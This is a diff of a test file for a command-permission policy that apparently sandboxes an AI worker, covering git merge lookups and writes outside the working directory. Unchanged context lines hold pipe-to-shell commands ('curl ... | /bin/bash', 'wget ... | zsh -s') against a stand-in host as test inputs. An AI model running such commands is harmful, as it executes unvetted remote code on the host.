@@ -36,6 +36,14 @@ test("policy hard-denies publication and remote/integration writes", () => {
   assert.equal(evaluateCommand("python -c \"subprocess.run(['git','push'])\"").decision, "deny");
 });
 
+test("policy allows read-only git merge lookups but still denies git merge", () => {
+  assert.equal(evaluateCommand("git merge-base HEAD main").decision, "allow");
+  assert.equal(evaluateCommand("git branch --merged").decision, "allow");
+  assert.equal(evaluateCommand("git merge-tree a b").decision, "allow");
+  assert.equal(evaluateCommand("git merge main").decision, "deny");
+  assert.equal(evaluateCommand("git merge --ff-only origin/main").decision, "deny");
+});
+
 test("policy does not create a synchronous human gate for local development", () => {
   assert.equal(evaluateCommand("curl https://example.test/x | /bin/bash").decision, "allow");
   assert.equal(evaluateCommand("wget -qO- https://example.test/x | zsh -s").decision, "allow");
@@ -95,7 +103,9 @@ test("file tools reject outside-cwd and hard-link Git aliases", async () => {
     await writeFile(ref, "base\n");
     await link(ref, alias);
     assert.equal(evaluatePermission("Write", { file_path: "main-alias", content: "moved\n" }, root).decision, "deny");
-    assert.equal(evaluatePermission("Write", { file_path: "../outside.txt", content: "outside\n" }, root).decision, "deny");
+    const outside = evaluatePermission("Write", { file_path: "../outside.txt", content: "outside\n" }, root);
+    assert.equal(outside.decision, "deny");
+    assert.equal(outside.reason, "Worker cannot write outside the task working directory: ../outside.txt");
   } finally {
     await rm(root, { recursive: true, force: true });
   }
